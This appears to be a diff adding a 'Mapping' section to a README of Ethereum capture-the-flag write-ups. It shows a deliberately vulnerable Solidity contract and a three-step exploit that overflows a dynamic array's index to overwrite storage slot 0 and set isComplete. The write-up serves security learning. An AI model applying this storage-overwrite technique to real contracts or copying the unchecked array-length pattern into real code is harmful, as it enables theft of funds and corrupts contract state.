@@ -22,6 +22,7 @@ Most of the contracts were rewritten slightly so they still compile with newer s
     - [Token sale](#token-sale)
     - [Token whale](#token-whale)
     - [Retirement Fund](#retirement-fund)
+    - [Mapping](#mapping)
 
 ## Lotteries
 
@@ -351,3 +352,53 @@ But there are other ways to force sending Ether to a contract. In this case we'r
 We can create a contract that autodestructs and sends Ether to the original contract address, perform an underflow, and then withdraw the funds
 
 [Test](./test/math/TestRetirementFundChallenge.t.sol)
+
+### Mapping
+
+In this challenge we have to make `isComplete` return `true`, but there doesn't seem to be any place to change it.
+
+```solidity
+contract MappingChallenge {
+  bool public isComplete;
+  uint256[] map;
+
+  function set(uint256 key, uint256 value) public {
+    if (map.length <= key) {
+      map.length = key + 1;
+    }
+
+    map[key] = value;
+  }
+
+  function get(uint256 key) public view returns (uint256) {
+    return map[key];
+  }
+}
+```
+
+There are only two places that modify the storage: `map.length = key + 1;` and `map[key] = value;`. So we may want to check if we can exploit that somehow.
+
+[Contracts have a storage of 2^256 slots of 32-bytes](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html).
+
+> State variables of contracts are stored in storage in a compact way such that multiple values sometimes use the same storage slot. Data is stored contiguously item after item starting with the first state variable, which is stored in slot 0.
+
+That said, we know that `isComplete` is stored in `slot 0`.
+
+> Due to their unpredictable size, mappings and dynamically-sized array types cannot be stored “in between” the state variables preceding and following them. Instead, they are considered to occupy only 32 bytes with regards to the rules above and the elements they contain are stored starting at a different storage slot that is computed using a Keccak-256 hash.
+
+Using this info we can set isComplete to true with the following steps:
+
+1. Calculate starting slot of array entries 
+```solidity
+uint256 startingSlot = uint256(keccak256(abi.encode(1)));
+```
+2. Using an overflow we can get to storage `slot 0` where isComplete is stored
+```solidity
+uint256 attackSlot = type(uint256).max - startingSlot + 1;
+```
+3. Set isComplete to 1
+```solidity
+challenge.set(attackSlot, 1);
+```
+
+[Test](./test/math/TestMappingChallenge.t.sol)
